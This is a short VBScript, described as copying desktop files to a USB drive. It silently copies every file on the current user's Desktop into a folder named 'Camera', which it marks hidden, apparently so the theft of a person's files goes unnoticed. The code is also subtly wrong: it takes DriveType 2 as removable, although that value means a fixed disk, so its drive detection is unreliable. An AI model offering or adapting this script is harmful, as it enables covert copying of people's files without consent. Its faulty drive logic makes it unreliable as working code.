' VBScript to copy desktop files to a USB drive
' KayHGNG
Option Explicit

Dim objFSO, objShell, strDesktopPath, strUSBPath, objFolder, objFile, colFiles
Dim strSystemDrive, strUSBLetter, colDrives, objDrive

' Create FileSystemObject and WScript.Shell objects
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Get the system drive letter
strSystemDrive = objShell.ExpandEnvironmentStrings("%SystemDrive%")

' Get all drives and find the USB drive
Set colDrives = objFSO.Drives
For Each objDrive In colDrives
    If objDrive.DriveType = 2 And objDrive.IsReady Then ' 2 represents removable drives
        strUSBLetter = objDrive.DriveLetter
        Exit For
    End If
Next

' Construct the path to the desktop
strDesktopPath = strSystemDrive & "\Users\" & objShell.ExpandEnvironmentStrings("%USERNAME%") & "\Desktop\"

' Construct the path to the USB drive
strUSBPath = strUSBLetter & ":\Camera\"

' Check if the "Camera" folder exists on the USB drive, create it if not
If Not objFSO.FolderExists(strUSBPath) Then
    objFSO.CreateFolder(strUSBPath)
    objFSO.GetFolder(strUSBPath).Attributes = 2 ' Hidden attribute
End If

' Get the desktop folder
Set objFolder = objFSO.GetFolder(strDesktopPath)

' Get all files in the desktop folder
Set colFiles = objFolder.Files

' Copy each file to the USB drive
For Each objFile In colFiles
    objFSO.CopyFile objFile.Path, strUSBPath & objFile.Name
Next

' Clean up
Set objFile = Nothing
Set colFiles = Nothing
Set objFolder = Nothing
Set objFSO = Nothing
Set objShell = Nothing
